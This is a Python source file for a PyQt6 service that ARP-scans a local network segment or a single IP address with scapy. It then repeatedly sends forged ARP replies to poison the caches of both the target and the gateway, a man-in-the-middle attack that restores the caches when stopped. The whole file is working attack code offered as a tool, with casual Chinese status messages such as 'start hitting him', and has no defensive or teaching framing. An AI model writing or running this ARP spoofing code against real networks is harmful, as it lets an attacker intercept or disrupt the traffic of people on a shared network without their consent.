import sys
import subprocess
import threading
from PyQt6.QtCore import QObject, pyqtSignal, QThread
import time
import logging

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sendp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class NMAPService(QObject):


    scan_result = pyqtSignal(str)
    error = pyqtSignal(str)
    spoofing_status = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._is_spoofing = False
        self._spoof_thread = None

    def scan_all_and_send_arp_spoof(self, target_mac, own_mac, gateway_ip, network_segment):
        thread = threading.Thread(target=self._scan_all_and_spoof,
                                  args=(target_mac, own_mac, gateway_ip, network_segment), daemon=True)
        thread.start()

    def scan_ip_and_send_arp_spoof(self, ip_address, target_mac, own_mac, gateway_ip, network_segment):
        thread = threading.Thread(target=self._scan_ip_and_spoof,
                                  args=(ip_address, target_mac, own_mac, gateway_ip, network_segment), daemon=True)
        thread.start()

    def _scan_all_and_spoof(self, target_mac, own_mac, gateway_ip, network_segment):
        try:
            self.scan_result.emit("开始扫...")
            arp = ARP(pdst=network_segment)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            result = srp(packet, timeout=3, verbose=0)[0]

            devices = []
            for sent, received in result:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})

            if not devices:
                self.scan_result.emit("没有啊.")
                return

            self.scan_result.emit(f"有{len(devices)} 个:")
            for device in devices:
                self.scan_result.emit(f"IP: {device['ip']}, MAC: {device['mac']}")

            # 开始 ARP 欺骗
            for device in devices:
                if not self._is_spoofing:
                    break
                self._start_arp_spoof(device['ip'], device['mac'], own_mac, gateway_ip, network_segment)

            self.scan_result.emit("扫完了.")

        except Exception as e:
            logger.exception("扫错了")
            self.error.emit(str(e))

    def _scan_ip_and_spoof(self, ip_address, target_mac, own_mac, gateway_ip, network_segment):
        try:
            self.scan_result.emit(f"扫单个开始: {ip_address}")
            arp = ARP(pdst=ip_address)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            result = srp(packet, timeout=3, verbose=0)[0]

            if not result:
                self.scan_result.emit(f"填错了吧: {ip_address}")
                return

            received = result[0][1]
            device = {'ip': received.psrc, 'mac': received.hwsrc}
            self.scan_result.emit(f"有了 - IP: {device['ip']}, MAC: {device['mac']}")

            # 开始 ARP 欺骗
            self._start_arp_spoof(ip_address, device['mac'], own_mac, gateway_ip, network_segment)
            self.scan_result.emit(f"开始干他: {device['ip']}")

        except Exception as e:
            logger.exception("哪填错了")
            self.error.emit(str(e))

    def _start_arp_spoof(self, target_ip, target_mac, own_mac, gateway_ip, network_segment):
        if self._is_spoofing:
            self.scan_result.emit("别点了")
            return

        self._is_spoofing = True
        self._spoof_thread = threading.Thread(target=self._arp_spoof_loop,
                                              args=(target_ip, target_mac, own_mac, gateway_ip, network_segment),
                                              daemon=True)
        self._spoof_thread.start()
        self.spoofing_status.emit(f"开始干 {target_ip}")

    def _arp_spoof_loop(self, target_ip, target_mac, own_mac, gateway_ip, network_segment):
        try:
            spoof_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=own_mac, hwdst=target_mac)
            spoof_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=own_mac,
                                hwdst=self._get_mac_address(gateway_ip))

            while self._is_spoofing:
                sendp(Ether(dst=target_mac) / spoof_target, verbose=0)
                sendp(Ether(dst=self._get_mac_address(gateway_ip)) / spoof_gateway, verbose=0)
                time.sleep(2)

            # 恢复网络
            restore_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=self._get_mac_address(gateway_ip),
                                 hwdst=target_mac)
            restore_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac,
                                  hwdst=self._get_mac_address(gateway_ip))
            sendp(Ether(dst=target_mac) / restore_target, count=5, verbose=0)
            sendp(Ether(dst=self._get_mac_address(gateway_ip)) / restore_gateway, count=5, verbose=0)
            self.spoofing_status.emit(f"停止这场闹剧吧✋✋✋✋ {target_ip}")

        except Exception as e:
            logger.exception("不知道杀错")
            self.error.emit(str(e))

    def stop_spoofing(self):
        self._is_spoofing = False
        if self._spoof_thread and self._spoof_thread.is_alive():
            self._spoof_thread.join()
        self.spoofing_status.emit("停了")

    def _get_gateway_ip(self):
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith("default"):
                    parts = line.split()
                    gateway_index = parts.index("via") + 1
                    return parts[gateway_index]
            return None
        except Exception as e:
            self.error.emit("网关错了.")
            return None

    def _get_mac_address(self, ip):
        try:
            arp = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            result = srp(packet, timeout=3, verbose=0)[0]

            if result:
                return result[0][1].hwsrc
            else:
                return None
        except Exception as e:
            self.error.emit(f"MAC错了: {ip}")
            return None
